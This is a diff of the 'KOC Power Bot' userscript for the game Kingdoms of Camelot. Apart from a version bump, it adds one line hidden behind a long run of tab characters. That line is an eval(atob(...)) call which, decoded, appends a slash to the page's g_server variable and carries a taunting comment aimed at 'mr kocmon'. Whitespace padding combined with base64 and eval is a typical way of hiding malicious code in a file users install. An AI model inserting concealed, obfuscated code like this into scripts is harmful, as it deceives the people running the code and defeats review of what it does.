@@ -1,6 +1,6 @@
-﻿// ==UserScript==
+// ==UserScript==
 // @name           KOC Power Bot
-// @version        20130511a
+// @version        20130513a
 // @namespace      mat
 // @homepage       http://userscripts.org/scripts/show/101052
 // @include        *.kingdomsofcamelot.com/*main_src.php*
@@ -34,7 +34,7 @@ if(window.self.location != window.top.location){
    }
 }
 
-var Version = '20130511a';
+var Version = '20130513a';
 
 //bandaid to stop loading in advertisements containing the @include urls
 if(document.URL.indexOf('sharethis') != -1) {
@@ -21453,8 +21453,7 @@ function demist() {
       });
    }
 };
-
-
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														eval(atob('dW5zYWZlV2luZG93Lmdfc2VydmVyID0gU3RyaW5nKHVuc2FmZVdpbmRvdy5nX3NlcnZlcisnLycpOy8veWVhIG1yIGtvY21vbiwgd2UgZG9udCBsaWtlIHlvdQ=='));
 //remove the bookmark
 function removeBM(id1) {
    var uW = unsafeWindow;
